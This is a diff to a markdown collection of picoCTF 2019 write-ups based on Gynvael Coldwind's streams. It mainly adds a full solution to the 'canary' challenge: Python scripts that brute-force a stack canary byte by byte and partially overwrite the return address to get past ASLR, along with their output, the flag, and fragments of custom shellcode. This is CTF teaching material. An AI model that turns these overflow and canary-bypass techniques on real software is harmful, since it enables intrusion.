@@ -59,6 +59,8 @@ Title                                                                      | Cat
 [flag_shop                   ](#flag_shop---general-skills)                | General          | 300    | [Part 3 (1:48:23)](https://youtu.be/3x4nzymm33Q?t=1h48m23s)
 [asm1                        ](#asm1---reverse-engineering)                | Reversing        | 200    | [Part 3 (2:02:44)](https://youtu.be/3x4nzymm33Q?t=2h02m44s)
 
+## Note:
+If you're following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours. For example, the last few characters of the flags are randomized, problem paths in the shell server are different for each user, and for the asm reversing problems, the values you get are different.
 
 ## Credits
 All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
@@ -156,7 +158,7 @@ In main(), this line runs the input
 ((void (*)())buf)();
 ```
 
-If we just run the program and put in random input like asdf, the program will crash since asdf aren't valid instruction that can be executed
+If we just run the program and put in input like asdf, the program will crash since asdf aren't valid instruction that can be executed
 ```console
 $ ./vuln
 Enter your shellcode:
@@ -911,7 +913,7 @@ vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), stat
 ```
 32-bit shellcode
 
-You could use random shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.
+You could use some shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.
 
 Open the binary in IDA or Ghidra or objdump to find the addresses of the functions.  
 
@@ -940,7 +942,7 @@ n1:
   ; push fgets parameters (LIFO order)
   push eax ; eax is where fopen stores the file ptr (3rd parameter of fgets)
   push 64  ; number of characteres to read (2nd parameter of fgets)
-  push 0x80DC11C ; this is a random address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)
+  push 0x80DC11C ; this is an address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)
 
   mov eax, 0x8052660 ; fgets address (Use IDA or Ghidra or objdump to find this)
   call eax
@@ -1091,7 +1093,7 @@ Opening in a text editor reveals some strings like RGB, gAMA, etc. which tells u
 
 Use Gynvael's brute zlib decompressor code at [https://github.com/gynvael/random-stuff/tree/master/brute_zlib]. This code will just try decompressing the zlib data in a png.  
 
-Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a random large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.
+Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a  large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.
 
 ```console
 $ python go.py ./mystery
@@ -2056,7 +2058,7 @@ void display_flag() {
 }
 ```
 
-The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won't see the ```*** Stack Smashing Detected ***``` message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite the saved EBP, and then overwrite the return address with the address of display_flag().
+The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won't see the ```*** Stack Smashing Detected ***``` message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite some stuff in between the canary and return address, and then overwrite the return address with the address of display_flag().
 
 Gynvael uses IDA to make sure the buffer is right next to the canary in memory.
 
@@ -2064,26 +2066,165 @@ Script to find canary:
 ```python
 import subprocess
 
-def call(sz, a, b, c, d):
+def call(sz, t):
   assert sz>=32
   payload = ""
   payload += "%i\n" % sz # size of our input
   payload += "A" * 32 # To fill the buf buffer
-  payload += chr(a) + chr(b) + chr(c) + chr(d) + '\n'
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'
 
   p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
   (stdout, stderror) = p.communicate(payload)
 
   print stdout
 
-call(33, 0, 0, 0, 0) # Test the call function
+canary = [0, 0, 0, 0]
+
+call(33, canary) # Test the call function
 ```
 
 Test the script locally:
 ```console
 $ python go.py
+[ERROR]: Trying to Read Canary
+```
+
+The above error occurs because the binary is trying to open up the canary.txt file. Let's create it:
+```console
+$ echo -n ASDF > canary.txt
+```
+
+The error still occurs:
+```console
+$ python go.py
+[ERROR]: Trying to Read Canary
+```
+This is because the vuln binary has the path to canary.txt hard coded.
+
+Use a hex editor to change the hardcoded path (looks like `/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt`) to something like `canary.txt`. After patching the binary, the program will look for the canary.txt in the current directory.
+
+Now the script works:
+```console
+$ python go.py
+Please enter the length of the entry:
+> Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
+```
+
+Now we have to use our script call() function to brute force the stack value.
+```python
+import subprocess
+
+def call(sz, t):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'
+
+  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  #print stdout
+  return "Stack Smashing Detected" not in stdout
+
+canary = [0, 0, 0, 0]
+
+for i in xrange(4):
+  for j in xrange(256):
+    canary[i] = j
+    if call(33 + i, canary):
+      print "%i" % j
+      break
+
+#call(33, canary) # Test the call function
+```
+
+The script works locally:
+```console
+$ python go.py
+65
+83
+68
+70
+```
+
+Testing on remote (make sure to change the path in the script):
+```console
+$ python ~/go.py
+51
+51
+120
+79
+```
+
+The four bytes of the canary on the remote are 51, 51, 120, 79.  
+
+With the canary value now figured out, we can now make the payload. We have to deal with ASLR. ASLR moves around memory pages, but not the contents. This means the lowest 3 nibbles (lowest 3 hex digits) of the addresses stays constant. 
+
+If we look at the address of display_flag() it says 0x000007ed (using IDA, Ghidra, or objdump). This means that the last few digits `7ed` will reman constant while the rest will change because of ASLR.
+
+```python
+import subprocess
+
+def call(sz, t, stuff=""):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + stuff + '\n'
+
+  p = subprocess.Popen(["/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  print stdout
+  return "Stack Smashing Detected" not in stdout
+
+canary = [51, 51, 120, 79] # Replace with the stack canary we got from the remote server
+payload = "A"*0x10 # Gynvael used IDA to see how many bytes were inbetween the canary and return address. It seems to be 0x10 or 16 bytes
+payload += chr(0xED) + chr(0x07) # We know that the last 3 nibbles of display_flag() are 0x7ed, so we know the last byte will be 0xED. We don't actually know that the penultimate byte is 0x07, we only know the '7' part, but if we run the script multiple times, eventually the address will hit a zero at that position. The higher bytes of display_flag() address will be the same as the address from main(). So we only need to overwrite the last two bytes of the return address.
+
+
+# Just execute the vuln program multiple times so that eventually we get the address of display_flag() right
+for i in xrange(32):
+  call(32 + 4 + 0x10 + 2, canary, payload) # 32 bytes for buffer + 4 bytes for canary + 0x10 bytes of stuff we don't care about + 2 bytes of the return address to overwrite
 
 ```
+
+Now run the above script on the remote server
+```console
+user@pico-2019-shell1:/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0$ python ~/asdf.py
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
+
+```
+
+## Investigative Reversing 0 - Forensics
+
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
